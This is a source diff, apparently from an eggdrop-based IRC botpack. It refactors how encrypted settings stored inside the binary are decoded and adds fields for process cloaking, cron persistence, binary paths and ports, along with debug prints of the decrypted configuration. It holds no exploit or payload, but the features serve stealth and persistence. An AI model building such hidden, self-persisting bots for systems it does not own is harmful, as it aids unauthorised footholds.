@@ -14,7 +14,6 @@
 #include "main.h"
 #include "misc_file.h"
 
-
 /*
 typedef struct encdata_struct {
   char prefix[PREFIXLEN];
@@ -29,7 +28,12 @@ static encdata_t encdata = {
 
 settings_t settings = {
   "AAAAAAAAAAAAAAAA",
-  "", "", "", "", "", "", "", "", "", "", "",
+  /* -- STATIC -- */
+  "", "", "", "", "", "", "", "", "", "",
+  /* -- DYNAMIC -- */
+  "", "", "", "", "", "", "", "", "", "", "", "", "",
+  /* -- PADDING */
+  ""
 };
 
 #define PACK_ENC 1
@@ -236,51 +240,67 @@ static void edpack(struct settings_struct *incfg, const char *hash, int what)
   else
     enc_dec_string = decrypt_string;
 
-  tmp = enc_dec_string(hash, incfg->hash);
-  egg_snprintf(incfg->hash, sizeof(incfg->hash), tmp);
-  free(tmp);
+#define dofield(_field) 		do {		\
+	tmp = enc_dec_string(hash, _field);		\
+	egg_snprintf(_field, sizeof(_field), tmp);	\
+	free(tmp);					\
+} while (0)
 
-  tmp = enc_dec_string(hash, incfg->packname);
-  egg_snprintf(incfg->packname, sizeof(incfg->packname), tmp);
-  free(tmp);
-
-  tmp = enc_dec_string(hash, incfg->shellhash);
-  egg_snprintf(incfg->shellhash, sizeof(incfg->shellhash), tmp);
-  free(tmp);
-
-  tmp = enc_dec_string(hash, incfg->bdhash);
-  egg_snprintf(incfg->bdhash, sizeof(incfg->bdhash), tmp);
-  free(tmp);
-
-  tmp = enc_dec_string(hash, incfg->dcc_prefix);
-  egg_snprintf(incfg->dcc_prefix, sizeof(incfg->dcc_prefix), tmp);
-  free(tmp);
-
-  tmp = enc_dec_string(hash, incfg->owners);
-  egg_snprintf(incfg->owners, sizeof(incfg->owners), tmp);
-  free(tmp);
-
-  tmp = enc_dec_string(hash, incfg->owneremail);
-  egg_snprintf(incfg->owneremail, sizeof(incfg->owneremail), tmp);
-  free(tmp);
-
-  tmp = enc_dec_string(hash, incfg->hubs);
-  egg_snprintf(incfg->hubs, sizeof(incfg->hubs), tmp);
-  free(tmp);
+  /* -- STATIC -- */
+  dofield(incfg->hash);
+  dofield(incfg->packname);
+  dofield(incfg->shellhash);
+  dofield(incfg->bdhash);
+  dofield(incfg->dcc_prefix);
+  dofield(incfg->owners);
+  dofield(incfg->owneremail);
+  dofield(incfg->hubs);
+  /* -- DYNAMIC -- */
+  dofield(incfg->bots);
+  dofield(incfg->uid);
+  dofield(incfg->autouname);
+  dofield(incfg->pscloak);
+  dofield(incfg->autocron);
+  dofield(incfg->watcher);
+  dofield(incfg->uname);
+  dofield(incfg->username);
+  dofield(incfg->homedir);
+  dofield(incfg->binpath);
+  dofield(incfg->binname);
+  dofield(incfg->portmin);
+  dofield(incfg->portmax);
+#undef dofield
 }
 
 
 static void
 tellconfig(struct settings_struct *incfg)
 {
-  printf("hash: %s\n", incfg->hash);
-  printf("packname: %s\n", incfg->packname);
-  printf("shellhash: %s\n", incfg->shellhash);
-  printf("bdhash: %s\n", incfg->bdhash);
-  printf("dccprefix: %s\n", incfg->dcc_prefix);
-  printf("owners: %s\n", incfg->owners);
-  printf("owneremails: %s\n", incfg->owneremail);
-  printf("hubs: %s\n", incfg->hubs);
+#define dofield(_field)		printf("%s: %s\n", #_field, _field);
+  /* -- STATIC -- */
+  dofield(incfg->hash);
+  dofield(incfg->packname);
+  dofield(incfg->shellhash);
+  dofield(incfg->bdhash);
+  dofield(incfg->dcc_prefix);
+  dofield(incfg->owners);
+  dofield(incfg->owneremail);
+  dofield(incfg->hubs);
+  /* -- DYNAMIC -- */
+  dofield(incfg->bots);
+  dofield(incfg->uid);
+  dofield(incfg->autouname);
+  dofield(incfg->pscloak);
+  dofield(incfg->autocron);
+  dofield(incfg->watcher);
+  dofield(incfg->uname);
+  dofield(incfg->username);
+  dofield(incfg->homedir);
+  dofield(incfg->binpath);
+  dofield(incfg->binname);
+  dofield(incfg->portmin);
+  dofield(incfg->portmax);
+#undef dofield
 }
 
 void
@@ -296,6 +316,7 @@ check_sum(const char *fname, const char *cfgfile)
       fatal("Binary not initialized.", 0);
 
     readcfg(cfgfile);
+tellconfig(&settings);
     if (bin_md5(fname, WRITE_MD5, &ctx))
       printf("* Wrote settings to binary.\n"); 
     exit(0);
@@ -304,8 +325,10 @@ check_sum(const char *fname, const char *cfgfile)
 
 
     hash = bin_md5(fname, GET_MD5, &ctx);
-
+tellconfig(&settings);
     edpack(&settings, hash, PACK_DEC);
+printf("\n\n");
+tellconfig(&settings);
 
     if (strcmp(settings.hash, hash)) {
       unlink(fname);
